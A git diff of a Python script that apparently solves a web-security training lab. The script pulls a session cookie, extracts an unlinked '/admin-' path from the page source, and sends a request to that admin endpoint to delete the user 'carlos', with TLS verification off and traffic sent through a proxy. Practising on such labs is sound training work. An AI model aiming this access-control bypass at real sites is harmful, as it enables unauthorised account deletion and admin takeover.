@@ -18,11 +18,27 @@ def delete_user(url):
     #Retrieve session cookies
     session_cookie = r.cookies.get_dict().get('session') #get dic of cookies and from that get cookie named session
 
-    soup = BeautifulSoup(r.text, 'html.parser')
+    soup = BeautifulSoup(r.text, 'lxml')
     #find all the instances in the application that have a string admin- in it
-    admin_instances = soup.find(text = re.compile("/admin-"))
-    print("adming_insances" + admin_instances)
-
+    admin_instances = soup.find(string = re.compile("/admin-"))
+    print(admin_instances)
+    admin_path = re.search("href', '(.*)'", admin_instances).group(1)
+    # print(admin_path)
+    
+    #Delete carlos
+    cookies = {"session": session_cookie}
+    delete_carlos_url = url + admin_path + '/delete?username=carlos'
+    
+    print("delete url: " + delete_carlos_url)
+    r = requests.get(delete_carlos_url, cookies = cookies, verify= False, proxies=proxies)
+    
+    if r.status_code == 200:
+        print ('(+) carlos user deleted')
+    
+    else:
+        print('(+) Deletion failed')
+        print('(+) Exiting script....')
+        sys.exit(-1)
 
 
 #sys.argv is a list, which contains command line arguments
